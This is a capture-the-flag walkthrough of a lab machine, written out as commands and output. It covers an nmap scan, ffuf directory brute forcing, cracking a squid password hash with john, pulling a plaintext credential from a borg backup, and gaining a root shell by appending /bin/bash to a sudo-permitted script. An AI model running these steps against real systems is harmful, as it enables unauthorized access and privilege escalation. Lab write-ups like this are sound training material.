
> Author: jak010  
> Date: 2021.05.19

## Scan (Nmap)
- Command
	```sh
	$ namp -sC -sV {EXPORT_IP}
	```
	- Result
		```sh
		Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-19 16:58 KST
		NSE: Warning: Could not load 'docker-version.nse': no path to file/directory: docker-version.nse
		Stats: 0:01:22 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
		Connect Scan Timing: About 99.99% done; ETC: 16:59 (0:00:00 remaining)
		Nmap scan report for 10.10.28.79
		Host is up (0.28s latency).
		Not shown: 998 closed ports
		PORT   STATE SERVICE VERSION
		22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
		| ssh-hostkey:
		|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
		|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
		|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
		80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
		|_http-server-header: Apache/2.4.18 (Ubuntu)
		|_http-title: Apache2 Ubuntu Default Page: It works
		Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

		Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
		Nmap done: 1 IP address (1 host up) scanned in 102.65 seconds
		```

## Directory Brute Forcing
- Command
	```sh
	$ ffuf -w raft-large-directories-lowercase.txt -u http://10.10.28.79/FUZZ
	```
	- Result
		```
				/'___\  /'___\           /'___\
			/\ \__/ /\ \__/  __  __  /\ \__/
			\ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
				\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
				\ \_\   \ \_\  \ \____/  \ \_\
				\/_/    \/_/   \/___/    \/_/

			v1.2.1
		________________________________________________

		:: Method           : GET
		:: URL              : http://10.10.28.79/FUZZ
		:: Wordlist         : FUZZ: raft-large-directories-lowercase.txt
		:: Follow redirects : false
		:: Calibration      : false
		:: Timeout          : 10
		:: Threads          : 40
		:: Matcher          : Response status: 200,204,301,302,307,401,403,405
		________________________________________________

		admin                   [Status: 301, Size: 310, Words: 20, Lines: 10]
		etc                     [Status: 301, Size: 308, Words: 20, Lines: 10]
		server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
								[Status: 200, Size: 11321, Words: 3503, Lines: 376]
		```

	- Interesting Path
		- http://{EXPORT_IP}/etc/squid/passwd
		- http://{EXPORT_IP}/etc/squid/squid.conf


## Password Brute Forcing
- Command
	```sh
	john --wordlist=/SecLists/Passwords/xato-net-10-million-passwords-1000000.txt credential.txt
	```
	- Result
		```
		Loaded 1 password hash (md5crypt [MD5 32/64 X2])
		Press 'q' or Ctrl-C to abort, almost any other key for status
		squidward        (music_archive)
		1g 0:00:00:10 100% 0.09832g/s 15509p/s 15509c/s 15509C/s squier..squidward
		Use the "--show" option to display all of the cracked passwords reliably
		Session completed
		```

## Using BorgBackup Tool
- Command
	```sh
	$ ./borg extrach /path/::music_archive
	```
- File for Next Step
	- cat home/alex/Desktop/secret.txt
		- Result
			```
			shoutout to all the people who have gotten to this stage whoop whoop!"
			```
	- cat home/alex/Documents/note.txt
		- Result
			```
			Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

			alex:S3cretP@s3
			```
- USER CREDENTIAL
	- alex:S3cretP@s3	

## Priviliege Esclate
- `sudo -l`
	```text
	Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
	```
	- Steps for this Case
		```sh
		$ chmod 777 /etc/mp3backups/backup.sh
		$ echo "/bin/bash" >> /etc/mp3backups/backup.sh
		$ sudo /etc/mp3backups/backup.sh
		```
	